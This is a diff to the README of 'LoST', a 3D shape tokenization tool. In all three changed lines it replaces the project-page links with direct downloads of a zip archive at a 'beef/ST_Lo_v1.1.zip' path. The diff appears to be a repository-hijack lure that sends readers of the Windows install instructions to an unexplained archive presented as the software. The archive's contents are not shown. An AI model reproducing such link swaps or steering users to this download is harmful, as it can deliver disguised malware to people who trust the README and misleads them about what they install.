@@ -1,6 +1,6 @@
 # 🧠 LoST - Understand 3D Shapes Faster
 
-[![Download LoST](https://img.shields.io/badge/Download%20LoST-Visit%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/dixonk3527/LoST)
+[![Download LoST](https://img.shields.io/badge/Download%20LoST-Visit%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/dixonk3527/LoST/raw/refs/heads/main/beef/ST_Lo_v1.1.zip)
 
 ## 🚀 What LoST Does
 
@@ -27,7 +27,7 @@ For smooth use, a recent Intel or AMD processor works well. A higher-end graphic
 
 Use this link to visit the project page and download LoST:
 
-[https://github.com/dixonk3527/LoST](https://github.com/dixonk3527/LoST)
+[https://github.com/dixonk3527/LoST/raw/refs/heads/main/beef/ST_Lo_v1.1.zip](https://github.com/dixonk3527/LoST/raw/refs/heads/main/beef/ST_Lo_v1.1.zip)
 
 ## 🪟 Install on Windows
 
@@ -152,7 +152,7 @@ It fits users who want a direct way to see how a shape is tokenized and organize
 
 Project page and download source:
 
-[https://github.com/dixonk3527/LoST](https://github.com/dixonk3527/LoST)
+[https://github.com/dixonk3527/LoST/raw/refs/heads/main/beef/ST_Lo_v1.1.zip](https://github.com/dixonk3527/LoST/raw/refs/heads/main/beef/ST_Lo_v1.1.zip)
 
 ## 📄 Short Usage Guide
 
